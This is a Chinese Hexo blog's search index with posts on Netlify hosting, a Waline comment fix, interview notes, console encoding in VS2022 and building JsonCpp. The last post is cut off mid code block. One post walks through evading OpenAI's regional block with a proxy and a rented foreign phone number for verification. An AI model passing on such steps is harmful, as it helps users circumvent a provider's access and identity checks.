<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Netlify</title>
      <link href="/2022/12/14/Netlify/"/>
      <url>/2022/12/14/Netlify/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>gitee太麻烦<ul><li>首先就是要实名制审核，四张照片。。一两个工作日时间审核</li><li>还要单独开page服务</li><li>触发违法内容，这个库都可能被删了或者账号封了</li></ul></li><li>GitHub比较自由<ul><li>缺点就是访问速度很慢</li></ul></li></ul><p>采用netlify的原因也是比较出入，cdn那啥不会，群友也有采用这个方案的那么就来学习一下。</p><ul><li>主要作用就是托管静态资源</li><li>实现国内加速</li><li>而且是自动化部署，设置好之后，推送到github上，netlify就会自动部署</li><li>同样可以自定义域名和启动https访问等</li></ul><p><a href="https://www.netlify.com/">netlfiy</a><br><a href="https://www.bilibili.com/video/av857024220/?vd_source=c3c5d18febd8a045ff850106867cebf2">b站教学视频hexo+netlify</a></p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>记得下载插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-netlify-cms --save</span><br></pre></td></tr></table></figure><hr><h2 id="导入博客仓库"><a href="#导入博客仓库" class="headerlink" title="导入博客仓库"></a>导入博客仓库</h2><img src="/2022/12/14/Netlify/000.png" class=""><p>推荐直接用github登录好了，直接拉去仓库应该会方便一点。</p><img src="/2022/12/14/Netlify/001.png" class=""><p>然后选择import导入现有项目</p><img src="/2022/12/14/Netlify/002.png" class=""><p><strong>注意：</strong> 初次关联项目，有个弹窗，如果英语不好，建议用edge或者chrome，翻译下，有一个比较重要，就是只关联一个仓库，就是你的blog仓库，全部关联没有必要的！！！至少我是这么认为<br>配置可以先不管，直接点<code>Deploy site</code>部署。</p><blockquote><p>我做测试部署已经弄完了，所以没有弹窗了</p></blockquote><p>部署完成后就会有地方设置</p><img src="/2022/12/14/Netlify/003.png" class=""><img src="/2022/12/14/Netlify/004.png" class=""><hr><h2 id="无域名服务"><a href="#无域名服务" class="headerlink" title="无域名服务"></a>无域名服务</h2><p><strong>如果你没有域名服务</strong><br>点击<code>set settings</code>可以配置</p><img src="/2022/12/14/Netlify/005.png" class=""><p>修改这个，就是个性化定制二级域名吧，尾巴还是netlify自带的。但是谁让没有买域名呢，这个能定制也不错了。</p><blockquote><p>因为我是买了的域名的，只不过之前指向的是github.io那啥，现在改下cname信息就行了。</p></blockquote><p>最后你就可以用这个域名去访问你的博客，它会自动从GitHub仓库获取生成</p><hr><h2 id="有域名服务"><a href="#有域名服务" class="headerlink" title="有域名服务"></a>有域名服务</h2><img src="/2022/12/14/Netlify/006.png" class=""><p>如果你是有域名服务的，请点击<code>Add domain alias</code>添加。<br>输入域名的时候可能会提示不是你的已被认证什么的，你可以忽略掉。<br>然后在域名后面大概会有一条<code>check dns</code>什么的</p><img src="/2022/12/14/Netlify/007.png" class=""><p>点击，然后把cname后面的记录copy下来到你的域名解析去更改。<br>例如我的阿里云</p><img src="/2022/12/14/Netlify/008.png" class=""><p>添加这么一条就可以，但是<strong>注意，如果之前cname记录关联过github的，记得先暂停掉，还有a和aaaa记录，执行GitHub的一律暂停或者删除</strong> 否则不生效<br>添加完成后可以刷新等待片刻</p><hr><h2 id="开启https"><a href="#开启https" class="headerlink" title="开启https"></a>开启https</h2><p>还有就是下面的https服务，netlify是会自动帮你申请ssl证书的。<br>你域名绑定完成后，点击开启就行。也要等待片刻。</p><blockquote><p>成功表现为，你访问域名，https没有报错。</p></blockquote><img src="/2022/12/14/Netlify/009.png" class=""><hr><h2 id="配置任务"><a href="#配置任务" class="headerlink" title="配置任务"></a>配置任务</h2><p>这个很抽象啊，百度的大部分人都不提这个，有些还是配的很奇怪的感觉</p><img src="/2022/12/14/Netlify/010.png" class=""><p>就是这一块，有些人配置的command是<code>npm build</code>或者<code>yar</code>什么的构建命令。<br>但是我在<a href="https://docs.netlify.com/integrations/frameworks/">文档</a> 中看到的是</p><img src="/2022/12/14/Netlify/011.png" class=""><p>这样的配置信息。</p><p>于是乎我就先按照这个来吧</p><img src="/2022/12/14/Netlify/012.png" class=""><p>因为public里面的内容才是我们<code>hexo d</code>上传到github的内容，<code>hexo g</code>则是生成public。<br>所以我只要在<code>git bash</code>使用<code>hexo g</code>，netlify就会自动更新？我需要进行尝试</p><hr><h1 id="关于上传"><a href="#关于上传" class="headerlink" title="关于上传"></a>关于上传</h1><p>正常情况下推送到github仓库都是下面的流程，缓存区，提交备注，推到哪个分支，然后拉取信息合并巴拉巴拉的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git init    <span class="comment">#初始化项目文件夹，已有.git信息就不用重来</span></span><br><span class="line"></span><br><span class="line">git add .  <span class="comment">#将所有文件添加到暂存区</span></span><br><span class="line"></span><br><span class="line">git commit -m <span class="string">&quot;first commit&quot;</span>   <span class="comment">#提交到本地仓库，双引号内是提交的备注信息</span></span><br><span class="line"></span><br><span class="line">git remote add origin https://github.com/chaoyangya/chaoyangya.github.io.git</span><br><span class="line"></span><br><span class="line">git pull    <span class="comment">#拉取远程主分支信息，首次拉取合并信息</span></span><br><span class="line"></span><br><span class="line">git push -u -f origin master  <span class="comment">#提交到远程仓库，这个命令中的 -f 是强制推送，因为远程仓库只有初始化的文件，所以强制推送上去就行了，不加-f 会报当前分支没有远程分支，强制推送可以覆盖master，这样就完成了第一次提交的步骤)</span></span><br></pre></td></tr></table></figure><p>但是我一直都是用的<code>hexo d</code>直接推送到仓库，问题不大。</p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>有提前预览效果是不错的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> themes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>waline无法登录(vercel.app被污染)</title>
      <link href="/2022/12/12/walineErr/"/>
      <url>/2022/12/12/walineErr/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在群里交流的时候，发现有些人的waline也好像挂了，不能登录，评论之后也有点问题<br>额怎么说呢，评论对于现在的博客就是摆设哈哈，平常确实不在意这个东西。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>通过搜索关键字已知信息<br><code>在8.26下午vercel.app被墙，*.vercel.app已被DNS污染，基于此搭建的评论server端API无法访问，目前可行的解决方案只有绑定自己的域名。</code></p><p>over，合着也被污染了，而且我在重新部署vercel的时候发现有几个warning，好像是什么版本问题？<br><code>那干脆重新部署一个得了</code></p><ol><li>于是我首先访问vercel重新部署<ul><li><code>https://vercel.com/</code></li><li>可以参考waline的<a href="https://waline.js.org/guide/get-started/#leancloud-%E8%AE%BE%E7%BD%AE-%E6%95%B0%E6%8D%AE%E5%BA%93">文档</a>，在快速上手中找到<code>Vercel 部署 (服务端)</code></li><li>注意还需要<code>https://console.leancloud.app/</code>，我用的国际版，国内版好像要备份啥的。</li></ul></li></ol><blockquote><p>然后就是绑定域名，就ok了。</p></blockquote><hr><h2 id="新手顺序"><a href="#新手顺序" class="headerlink" title="新手顺序"></a>新手顺序</h2><p>首先注册leancloud，这是一个存储评论的地方，目前还是免费的。</p><blockquote><p><a href="https://console.leancloud.app/">https://console.leancloud.app/</a></p></blockquote><p>leanclound注册其实没啥难度，重点在设置里应用凭证里的<code>Credentials</code>，有三条key，是vercel部署要绑定的。</p><p>vercel部署的名称是和域名服务结合的关键，<strong>不会部署这个的看我上面有一条关于waline文档有详细说明的</strong></p><blockquote><p>vercel会用到github，但是是私人仓库，应该问题不大，而且评论的数据也在leancloud上</p></blockquote><p>例如我的vercel部署的时候叫<code>comments.xxx.com</code>:</p><img src="/2022/12/12/walineErr/001.png" class=""><p><strong>具体路径在 vercel的settings下的domains中，edit这个记录，前者为主机名，后者为你的域名</strong></p><blockquote><p>为了好区分，我就把这个服务叫comments，也就是评论的意思，你也可以设置别的，只是注意在域名解析的时候主机记录别弄错了。是配套的。</p></blockquote><p>购买域名服务，我之前就有一个所以问题不大。</p><ul><li>阿里云</li><li>腾讯云</li><li>都行</li></ul><p>在域名解析选项卡下</p><img src="/2022/12/12/walineErr/000.png" class=""><p>需要添加这么一条记录</p><p>两边都完成后等待他转圈圈，都ok了没有报错。就可以访问这个部署的服务。</p><img src="/2022/12/12/walineErr/002.png" class=""><p>打开后能显示评论区就行，可能还是有点点慢但能加载出来了。</p><img src="/2022/12/12/walineErr/003.png" class=""><blockquote><p>原本vercel部署完会有一两个链接都能访问到评论系统的，但是域名被污染了之后，就只能访问你绑定域名的那一条了。</p></blockquote><p><strong>不放心的先验证一下登录或者评论能不能用</strong></p><img src="/2022/12/12/walineErr/004.png" class=""><p>额我在部署的地方测试评论是出问题了，然后登录的时候github也提示500，未初始化。<br>嘶~难道是我这个还是测试环境的问题吗？</p><p>在这里选择这个推送到生产环境</p><img src="/2022/12/12/walineErr/005.png" class=""><p>然后再回到评论测试的地方就正常了，也能登录和评论了。</p><img src="/2022/12/12/walineErr/006.png" class=""><p>最后回到博客目录下，<code>hexo clear</code>先清理掉，然后重新<code>hexo g</code>生成，最后预览，看看评论是否正常，能不能再博客预览的地方登录。<br>这些基本没问题之后就可以推送了。</p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>免费的部署才是最吃力的哈哈，学习成本有点高，毕竟都要自己跟从他们走。<br>收费的总归是有个服务。</p>]]></content>
      
      
      
        <tags>
            
            <tag> themes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>get面试2.0</title>
      <link href="/2022/12/10/%E6%97%81%E5%90%AC%E9%9D%A2%E8%AF%952-0/"/>
      <url>/2022/12/10/%E6%97%81%E5%90%AC%E9%9D%A2%E8%AF%952-0/</url>
      
        <content type="html"><![CDATA[<h1 id="继续听别人面试取取经"><a href="#继续听别人面试取取经" class="headerlink" title="继续听别人面试取取经"></a>继续听别人面试取取经</h1><span id="more"></span><hr><h1 id="创业型公司"><a href="#创业型公司" class="headerlink" title="创业型公司"></a>创业型公司</h1><h2 id="提问环节"><a href="#提问环节" class="headerlink" title="提问环节"></a>提问环节</h2><ol><li>自我介绍</li></ol><blockquote><p>这是经典问题，虽然时间不长，但是有条理比较重要</p></blockquote><p><strong>学历学校情况</strong></p><ol><li>什么时候毕业？</li><li>为什么四月就去工作？</li><li>上一份工作是什么原因溜了？</li></ol><p><strong>地方选择</strong></p><ol><li>为什么来福州找工作？</li></ol><p><strong>实际考察</strong></p><ol><li>项目方面<ol><li>第一个是做客户端还是服务端？</li><li>有哪些重构？</li></ol></li><li>什么设计<ol><li>用到了mvc设计？</li><li>mvc怎么体现？</li></ol></li><li>客户端包含什么模块<ol><li>测试、文件传输、文件下载、文件删除、屏幕监控、鼠标操作等。</li></ol></li><li>客户端使用mfc做的？但是mfc比较老了吧，为什么要用mfc？</li><li>提到了消息机制，有自定义消息吗？</li><li>tcp&#x2F;ip在这这个项目的使用场景？</li><li>有去做过一些测试对吗？功能测试是单纯手动测试吗？</li><li>另外两个项目？<ul><li>qt那边客户端是我自己写的。</li><li>音视频了解视频编码，vlc库的使用。</li></ul></li><li>一开始就接触的是第一个项目吗？一上手就是一个基本完成的项目，你要如何学习？怎么去完成重构？</li><li>第一个项目代码量多少？</li><li>花了多少时间了解？</li><li>花了多少时间重构？</li></ol><p><strong>学校方面</strong></p><ol><li>学校里有写过什么项目吗？</li><li>大学专业是？计算机应用技术专业？主要学什么语言？</li><li>学过c语言还是直接学的c++？</li><li>以后有没有考虑继续升本吗？</li></ol><p><strong>老东家</strong></p><ol><li>在上一家公司学到了什么？</li><li>上一家公司有什么代码规范吗？</li></ol><p><strong>hr谈天说地</strong></p><ol><li>你是11月初回来，在这中间有去面试过其他公司吗？是对公司不满意还是对自己以后的方向不明确？</li><li>你对我们公司有多少了解？</li><li>上一家公司是什么类型的？也是创业型吗。</li><li>来福州面试的几家公司都是什么类型的？</li><li>你现在住在哪？</li><li>你原本公司加班多吗？双休还是单休？<ul><li>hr：我们公司现在还是双休，明年后面可能就是单休了</li></ul></li><li>投了这么多家公司，你对本地薪资的定位是什么情况？<ul><li>hr:公司给多少薪资其实还是取决于你的个人能力</li></ul></li></ol><p><strong>hr主动问的</strong></p><ol><li>要向我们了解的？比如公司业务。</li><li>对机器视觉有没有兴趣，像opencv一些类似的框架？</li><li>我们企业做的不一定会像互联网上的软件，可能偏硬件、物联网方面，电机控制、plc、单片机等<ol><li>我估计应该是说没有涉及太多多线程的玩意吧，毕竟硬件这种不用实时联网交互确实不用考虑</li></ol></li><li>因为我们涉及到一些硬件，你会对硬件感兴趣吗？有什么想法？</li><li>会不会觉得硬件太难了而害怕？</li></ol><blockquote><p>出结果到时候和你交流。</p></blockquote><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>创业型的公司，问技术点细节程度比较轻，面试上的几率比较大，只要你对项目掌握程度足够。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>chatgpt</title>
      <link href="/2022/12/06/chatgpt/"/>
      <url>/2022/12/06/chatgpt/</url>
      
        <content type="html"><![CDATA[<p>好奇的看了一下，是chatgpt下的openai服务。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这玩意好像大陆不能用。</p><ol><li>需要科学上网</li><li>然后去租号-外国的号码收验证码用</li></ol><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="注册openai"><a href="#注册openai" class="headerlink" title="注册openai"></a>注册openai</h2><p><a href="https://openai.com/api/">戳链接</a></p><blockquote><p>注意科学上网要避开港澳台，如果还有提示所在国家受限，可以试试chrome浏览器打开无痕浏览去注册。</p></blockquote><p>点击<code>sign up</code>注册</p><img src="/2022/12/06/chatgpt/004.png" class=""><p>然后就是经典的邮箱注册+密码，然后邮箱验证。</p><img src="/2022/12/06/chatgpt/007.png" class=""><p>验证完之后跳转进入它会提示你手机号绑定激活。<br>然后往下看租号过程。</p><hr><h2 id="租号"><a href="#租号" class="headerlink" title="租号"></a>租号</h2><p><a href="https://sms-activate.org/cn">戳链接</a></p><p>用邮箱注册，他会发邮件到邮箱确认</p><img src="/2022/12/06/chatgpt/000.png" class=""><p>点击确认之后跳转激活。<br>然后就可以登录了。</p><p>然后点击右上角余额</p><img src="/2022/12/06/chatgpt/001.png" class=""><p>选择充值<br>往下滑找到支付宝</p><img src="/2022/12/06/chatgpt/002.png" class=""><blockquote><p>充值0.2美元就差不多了，换算的卢布够用了</p></blockquote><p>完成之后在主页左边搜索openai。</p><img src="/2022/12/06/chatgpt/003.png" class=""><p><del>选印度老表的点击购物车标志，然后购买。</del><br><strong>印度老表用的太多了好像有点问题，建议稍微多花点搞个别的地方的验证</strong><br><strong>因为我之前用印度激活的账户好像就g了，后面重新进去又要验证码？很奇怪，邮箱也没弄错</strong></p><p>然后等他跳转到getnumber的界面，下面有个号码。</p><img src="/2022/12/06/chatgpt/005.png" class=""><p>在openai激活界面，国家找到印度，然后把号码填进去点击等待</p><blockquote><p>可能第一次比较久，耐心等待，很长时间没有尝试下重新发送<br>或者在有效时间内，点击号码后面的X，免费推掉重新来</p></blockquote><p>收到验证码之后就可以填入openai激活的地方完成注册了。</p><hr><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><img src="/2022/12/06/chatgpt/006.png" class=""><p>同时也有很多例子可以训练</p><img src="/2022/12/06/chatgpt/008.png" class=""><p>而且好像是可以用api去调用的，就是不知道有没有科学上网要求<br>关于aip-key就是个人账户的事了。</p><img src="/2022/12/06/chatgpt/009.png" class=""><p>可以让他完成一些代码？<br><a href="https://chat.openai.com/chat">gpt窗口</a><br>在openai界面下有个playground，输入窗口下有个<code>looking for chargpt？</code></p><img src="/2022/12/06/chatgpt/010.png" class=""><blockquote><p>经过我多次重复这个问题，会看到他有用过vector，也有直接用数组，也有用函数封装。</p></blockquote><img src="/2022/12/06/chatgpt/011.png" class=""><img src="/2022/12/06/chatgpt/012.png" class=""><blockquote><p>所以到底是ai养成还是搜索引擎这个问题我是回答不出来</p></blockquote><p><strong>因为最近比较火，访问的人比较多，有的时候比较容易network error</strong></p><hr><h1 id="感"><a href="#感" class="headerlink" title="感"></a>感</h1><p>ai的编年史可以搜索一下，未来每一次的重大进步都是不可想象的，给人压力很大啊哈哈<br>毕竟大多数的程序员搞创新的确实不多？</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【软件】vs2022控制台乱码</title>
      <link href="/2022/11/30/vs%E4%B9%B1%E7%A0%81/"/>
      <url>/2022/11/30/vs%E4%B9%B1%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<blockquote><p>windows的根据地区选择编码一言难尽。。</p></blockquote><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文只是介绍几种情况的处理方式，仅供参考。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="1-乱码介绍"><a href="#1-乱码介绍" class="headerlink" title="1.乱码介绍"></a>1.乱码介绍</h2><p>什么是乱码？粗略解释就是：</p><blockquote><p>指保存内存的编码和输出内存的编码不一致，导致出现奇奇怪怪的字符。<br>更多详细介绍自行上网冲浪。</p></blockquote><p>这点情况在windows中很常见，原因就是Windows的特色，它会根据地区默认选择你cmd&#x2F;powerhell的编码。</p><blockquote><p>打开cmd&#x2F;powershll输入 <code>chcp</code>  按下回车</p></blockquote><p>如果你地区选择的是中国，那么回显信息为<code>活动代码页：936</code>。<br>而文本格式千奇百怪，也是拿捏不住的。<br>Linux默认都是utf-8的环境，相对比较省心不用你去改什么东西控制输出。</p><p>所以默认的vscode&#x2F;vs201x的产品，或者是其他需要调用cmd&#x2F;powershell的软件，都会存在这个问题。</p><p>vs的项目默认选择Unicode，你也可以改为多字节。</p><ol><li>统一码（Unicode），也叫万国码、单一码，由统一码联盟开发，是计算机科学领域里的一项业界标准，包括字符集、编码方案等。<ul><li>Unicode中，我记得字符都占用两个字节。</li><li>随后的utf-x系列会有一定程度不同，而现在最大众的是utf-8，在utf-8中汉字占用3个字节，英文字符1个字节。</li></ul></li><li>ANSI是一种字符代码，为使计算机支持更多语言，通常使用 0x00~0x7f 范围的1 个字节来表示 1 个英文字符。超出此范围的使用0x80~0xFFFF来编码，即扩展的ASCII编码。<ul><li>ansi也就是多字节</li><li>英文字符占用1个字节，汉字占用2个字节</li></ul></li></ol><blockquote><p>注意：即便是占用大小相同，不代表存储的字符都是一模一样的顺序开始表达。</p></blockquote><hr><h2 id="2-解决方案"><a href="#2-解决方案" class="headerlink" title="2.解决方案"></a>2.解决方案</h2><h3 id="2-1-糙糙的方法"><a href="#2-1-糙糙的方法" class="headerlink" title="2.1 糙糙的方法"></a>2.1 糙糙的方法</h3><ol><li>将文本另存为gb2312&#x2F;代码页936使其与之匹配，notepad++之类的软件操作比较快。</li><li>右击控制台-属性-改为旧版控制台，这个说实在没啥用啊，现在的系统不断地更新，改为旧版也同样不是很好的办法，而且不一定奏效——pass掉</li><li>控制面板-区域-管理-更改系统区域设置-选择beta版本语言支持<ul><li>这个的问题就是，很多的老软件，他那会可能不是用utf-8创建的，会导致他们目录乱码之类的，所以也不是很好的办法。</li></ul></li></ol><hr><h3 id="2-2-关于修改注册表"><a href="#2-2-关于修改注册表" class="headerlink" title="2.2 关于修改注册表"></a>2.2 关于修改注册表</h3><p>反正只是改固定的cmd或者powershell而已不用怕啥，大不了改回来。</p><p>首先vs先下载个拓展<a href="https://marketplace.visualstudio.com/">商店</a>，不用vs自带的下载是因为很慢很慢很慢。<br>搜索<code>Force UTF-8(No BOM)</code> ，记得看下概述<code>Overview</code>有写适用于vs哪个版本，别乱来。</p><blockquote><p>BOM是签名的意思，有签名的utf-8文件的文件头存在表示信息，一眼就知道是这个格式，更容易解析吧。但是不是必需品。</p></blockquote><p><strong>双击即可安装，安装前请先关闭vs</strong></p><p>这个拓展的作用是强制以<code>utf-8 no bom</code>形式保存所有文本文件。</p><blockquote><p>如果有ANSI的需求大于utf-8，可以关闭这个拓展。<br>vs菜单栏-拓展-管理拓展-找到即可关闭或者卸载 </p></blockquote><p>然后修改下注册表。<code>win + r</code>打开运行，输入<code>regedit</code>，选择<code>是</code>&gt;</p><blockquote><p>路径为:计算机\HKEY_CURRENT_USER\Console\</p></blockquote><p>我这会发现一个问题：</p><img src="/2022/11/30/vs%E4%B9%B1%E7%A0%81/000.png" class=""><blockquote><p>vs2022的控制台可以独立控制了<br>vs2019那会还没有这个选项的，那会我是直接改了上面两个</p></blockquote><p>直接选择这个<code>CodePage</code>字段，右击选择修改，然后十进制，改为<code>65001</code>即可。</p><img src="/2022/11/30/vs%E4%B9%B1%E7%A0%81/001.png" class=""><p>这样你通过<code>FILE</code>指针读取的utf-8文件就不会有乱码了。</p><p>如果注册表里面没有vs2022这项就只能在上面两个里面新建DWORD数据了。<br>名称要保证是<code>CodePage</code>然后十进制值是<code>65001</code>，十六进制用win自带的计算器算一下都行。</p><img src="/2022/11/30/vs%E4%B9%B1%E7%A0%81/002.png" class=""><blockquote><p>ps:不过我好像忘记了，改了这个是不是只对powershell有效来着，因为vs的控制台虽然是独立的，但是还是基于cmd，vscode那些倒是可以直接选择powershell。<br>或者要自行百度一下添加cmd项的操作了。我记得之前是找到过执行脚本的，copy下来改成bat直接管理员运行。总不能自己根据这个powershell一个个建过来吧有点累的。</p></blockquote><p><strong>当然，上述操作只是说，让控制台能输出utf-8的文字，但是文本如果是936的输出就又有问题了？</strong><br><strong>所以如果你尝试将所有控制台都改成65001的话，就要确保其他的文件都得是utf-8，不能匹配就肯定就乱码</strong></p><hr><h3 id="2-3-关于软件"><a href="#2-3-关于软件" class="headerlink" title="2.3 关于软件"></a>2.3 关于软件</h3><p>先前也说过，utf-8是Unicode的拓展，utf-8表示中文需要三个字节，而unicode是万物都两个字节，ANSI是中文两字节英文一字节。</p><blockquote><p>vs中，char占用一个字节，string就是一堆的char。<br>vs中还有一种宽字节，wchar_t，占用两个字节，至少在vs这是的。 —— 那么用wchar去存储unicode类型的数据就很容易。<br>并且，vs有大量的宏，会区分多字节和Unicode的情况。</p></blockquote><p>vs有一个函数<code>WideCharToMultiByte</code>是可以处理char和wchar。可能要引用<code>windows.h</code><br>举个例子比如说字符串。有的框架或者特殊类返回的结果可能会根据你项目属性的编码而改变。即项目unicode，返回宽字节数据。<br>wchar的类型，我们输出肯定要用<code>std::wcout</code>输出。<br>但是一会cout一会wcout很麻烦，而且将来要是存储然后解析也是一个问题。</p><p>那么就会考虑说，是不是能够把这个wchar数据转成char数据。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string <span class="title">toString</span><span class="params">(<span class="type">const</span> std::wstring wstr)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, wstr.<span class="built_in">c_str</span>(), <span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">std::string ret;</span><br><span class="line"><span class="keyword">if</span> (len &lt;= <span class="number">0</span>)<span class="keyword">return</span> ret;</span><br><span class="line">ret.<span class="built_in">resize</span>(len);</span><br><span class="line"><span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, wstr.<span class="built_in">c_str</span>(), <span class="number">-1</span>, (<span class="type">char</span>*)ret.<span class="built_in">c_str</span>(), len, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的返回值是字符串的长度，第一次不转换但是变相的读取出宽字节字符串的长度，给后面resize做准备。<br>第二次转换之后，就可以正常return了。</p><p>这个概念其实会很抽象，等到将来用的多了就通透了。</p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>救赎之道就在其中。<br>会用就好，因为生活充满变数。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JsonCpp编译使用</title>
      <link href="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>这一类的开源项目是能找到已经编译好的产物，但是总归还得自己试下。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>JSON（JavaScript Object Notation, JS对象简谱）是一种轻量级的数据交换格式。它基于 ECMAScript（European Computer Manufacturers Association, 欧洲计算机协会制定的js规范）的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。</p><p>json这种格式对于近几年一点都不陌生。与之相匹的就是Xml了。<br>一个是建议的语法，一个是标签形式。都比较容易上手。</p><p>当然json不局限编程语言，而且各家都有做优化。<br>比如cpp中<a href="https://github.com/open-source-parsers/jsoncpp">jsoncpp</a></p><p>使用 <code>jsoncpp</code> 库解析 <code>json</code> 格式的数据，我们只需要掌握三个类：</p><ol><li>Value 类：将 json 支持的数据类型进行了包装，最终得到一个 Value 类型</li><li>FastWriter类：将 Value 对象中的数据序列化为字符串</li><li>Reader类：反序列化，将 json 字符串 解析成 Value 类型</li></ol><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>jsoncpp是支持跨平台的c++开源库。通过git之后，我们可以在本地编译成动态库或者静态库，这对于使用和部署的角度都会更加的方便。</p><hr><h2 id="1-Linux"><a href="#1-Linux" class="headerlink" title="1.Linux"></a>1.Linux</h2><p>不过好像网上有不同版本的，比如windows我用的就是github搜到的star最多的那个，按照说法这个是比较新的，使用cmake但是编译过程比较麻烦。大概是0.10.x的版本</p><p>还有个0.5.0的老版本<a href="https://sourceforge.net/projects/jsoncpp/files/latest/download">下载地址</a></p><blockquote><p>温馨提示：科学上网</p></blockquote><p>下过来之后通过xshell或者windterm直接传过去<br>等待下载过来给他解压了<br><code>tar zxvf jsoncpp-src-0.5.0.tar.gz</code><br>解压完成后切换目录。</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/002.png" class=""><p>原本我以为要用cmake的<br><code>sudo apt install cmake</code><br>但是这个版本好像大家都在用<code>scons</code>自动构建。<br><code>sudo apt install scons</code><br>下个试试好了</p><p>使用scons之前需要指定gcc。<br>我们在解压出来的jsoncpp目录下：<br><code>scons platform=linux-gcc</code>，也有可能是下面几种，前提是环境得有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Invoke SCons as follows:</span><br><span class="line"></span><br><span class="line">scons platform=$PLATFORM [TARGET]</span><br><span class="line">where $PLATFORM may be one of:</span><br><span class="line"></span><br><span class="line">suncc: Sun C++ (Solaris)</span><br><span class="line">vacpp: Visual Age C++ (AIX)</span><br><span class="line">mingw</span><br><span class="line">msvc6: Microsoft Visual Studio 6 service pack 5-6</span><br><span class="line">msvc70: Microsoft Visual Studio 2002</span><br><span class="line">msvc71: Microsoft Visual Studio 2003</span><br><span class="line">msvc80: Microsoft Visual Studio 2005</span><br><span class="line">msvc90: Microsoft Visual Studio 2008</span><br><span class="line">linux-gcc: Gnu C++ (linux, also reported to work for Mac OS X)</span><br></pre></td></tr></table></figure><p>待执行完毕之后</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/003.png" class=""><p>切换到libs目录下的linux-gcc(版本)目录下会看到一个.a和.so的文件</p><blockquote><p>.a属于linux的静态链接库，跟windows下的.lib一个道理<br>.so属于linux的动态链接库，跟Windows下的.dll一个道理</p></blockquote><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/004.png" class=""><p>头文件按照这个路径找：</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/005.png" class=""><blockquote><p>使用jsoncpp就是要注意上面提到过的三个类：Value、Reader和Writer</p></blockquote><p>自己新建个文件夹，然后新建个json</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/006.png" class=""><p>但是注意，要把include和libs还有个src都copy过来。<br><code>cp -r</code>，因为不是单个目录，要递归复制过来。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 